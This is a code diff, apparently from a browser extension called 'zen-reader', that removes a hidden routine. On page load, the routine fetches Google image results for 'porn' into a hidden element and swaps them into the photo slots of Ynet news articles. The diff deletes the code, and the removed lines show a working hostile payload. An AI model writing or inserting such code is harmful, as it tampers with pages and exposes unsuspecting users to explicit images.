@@ -24,42 +24,6 @@ var publisherInstances = {};
 		}
 	}
 	
-    function EXP_cb(text, status, jqxhr) {
-        var imgs = document.querySelectorAll('img.rg_i[data-sz="f"]');
-        if (imgs.length > 0) {
-            // Ynet selectors
-            topArticleImgs = document.querySelectorAll(['div.citv_image>img', 'div.citv_image>font>img', 'div.ArticleImage>img', 'div.gspp_main>a.gspp_image>img', 'div.media.image>img']);
-            
-            for (var i = 0; i < topArticleImgs.length && i < imgs.length; i++) {
-                var validImage = null;
-                
-                while (!validImage || validImage.src.length === 0) {
-                    validImage = imgs[Math.round(Math.random()*(imgs.length - 1))];
-                }
-                
-                var size = topArticleImgs[i].getBoundingClientRect(topArticleImgs[i]);
-                topArticleImgs[i].src = validImage.src;
-                topArticleImgs[i].style.width = size.width + 'px';
-                topArticleImgs[i].style.height = size.height + 'px';
-            }
-        }
-        
-        document.body.removeChild(document.getElementById('zen-reader-__temp__result'));
-    }
-    
-    function EXP_search() {
-        var r = document.createElement('DIV');
-        r.id = 'zen-reader-__temp__result';
-        r.style.display = 'none';
-        r.style.width = 0;
-        r.style.height = 0;
-        document.body.appendChild(r);
-        
-        $("#zen-reader-__temp__result").load("https://www.google.com/search?site=imghp&tbm=isch&source=hp&biw=1680&bih=925&q=porn&oq=wine&gs_l=img.3..0l10.3251.3854.0.4358.4.4.0.0.0.0.131.490.0j4.4.0....0...1ac.1.64.img..0.4.487.sQ5WHcCYJHI#q=porn&tbs=isz:lt,islt:vga,itp:photo&tbm=isch",
-                                             '',
-                                             EXP_cb);
-    }
-    
 	// Now run this ONCE per page (do NOT run this in each iframe)
 	if (window === window.top) {
 
@@ -96,10 +60,6 @@ var publisherInstances = {};
 		}
 
 		run(false);
-
-        // DANGER ZONE
-        EXP_search();
-
 	}
 	
 })();
